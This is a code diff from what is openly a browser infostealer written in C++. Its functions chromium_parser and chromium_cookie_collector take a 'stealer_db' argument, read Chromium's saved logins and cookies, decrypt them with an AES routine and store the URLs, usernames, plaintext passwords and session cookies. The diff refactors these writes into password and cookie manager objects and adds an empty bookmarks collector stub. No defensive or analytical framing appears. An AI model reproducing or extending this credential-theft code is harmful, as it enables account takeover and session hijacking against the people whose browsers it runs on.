@@ -87,15 +87,15 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 						if ((strlen(url) == 0) || (strlen(username) == 0) || password.empty())
 							continue;
 
-						data.setUrl(url);
-						data.setUsername(username);
-						data.setHost(dir);
+						data.get_password_manager().setUrl(url);
+						data.get_password_manager().setUsername(username);
+						data.get_password_manager().setHost(dir);
 
 						try
 						{
 							//decrypt password here
 							std::string decrypted_password = obj.AESDecrypter(password);
-							data.setPassword(decrypted_password);
+							data.get_password_manager().setPassword(decrypted_password);
 						}
 						catch(int e)
 						{
@@ -194,16 +194,16 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 							continue;
 
 
-						data.setUrl(host_key);
-						data.setCookieName(name);
-						data.setHost(dir);
-						data.setCookieExpiry(expiry);
+						data.get_cookies_manager().setUrl(host_key);
+						data.get_cookies_manager().setCookieName(name);
+						data.get_cookies_manager().setHost(dir);
+						data.get_cookies_manager().setCookiesExpiry(expiry);
 
 						try
 						{
 							//decrypt cookies here
 							std::string decrypted_cookies = obj.AESDecrypter(cookies);
-							data.setCookies(decrypted_cookies);
+							data.get_cookies_manager().setCookies(decrypted_cookies);
 						}
 						catch (int e)
 						{
@@ -233,4 +233,9 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 		return false;
 
 	return true;
+}
+
+BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db)
+{
+
 }
